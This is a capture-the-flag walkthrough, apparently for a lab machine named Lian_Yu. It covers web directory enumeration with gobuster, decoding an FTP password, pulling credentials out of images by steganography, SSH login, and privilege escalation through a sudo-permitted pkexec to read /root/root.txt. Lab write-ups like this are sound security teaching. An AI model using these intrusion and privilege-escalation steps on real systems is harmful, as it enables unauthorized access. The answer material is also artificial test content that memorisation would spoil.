# Lian\_Yu

### **What is the Web Directory you found?**

```
nmap 10.10.219.116
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 14-08-26.png>)

```
gobuster dir -u http://10.10.219.116/ \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
             -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 14-12-45.png>)

```
gobuster dir -u http://10.10.219.116/island \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
             -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 14-22-29.png>)

### **what is the file name you found?**

![](<../../.gitbook/assets/Screenshot from 2020-09-16 14-25-54.png>)

```
gobuster dir -u http://10.10.219.116/island/2100 \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
             -t64 -x .ticket
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 14-27-20.png>)

### **what is the FTP Password?**

```
echo -n 'RTy8yhBQdscX' | base58 -d
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 14-35-50.png>)

### **what is the file name with SSH password?**

![](<../../.gitbook/assets/Screenshot from 2020-09-16 14-42-01.png>)

```bash
lftp 10.10.219.116 -u 'vigilante,!#th3h00d'
lftp :~> ls -a
lftp :~> get Leave_me_alone.png
lftp :~> get Queen's_Gambit.png
lftp :~> get aa.jpg
lftp :~> cat .other_user
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 15-15-51.png>)

```
hexeditor Leave_me_alone.png
steghide extract -sf aa.jpg
unzip ss.zip
cat shado
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 14-49-29.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-16 14-52-16.png>)

### **user.txt**

```
ssh slade@10.10.219.116 cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 15-17-11.png>)

### **root.txt**

```
sudo -l
sudo /usr/bin/pkexec cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 15-18-57.png>)
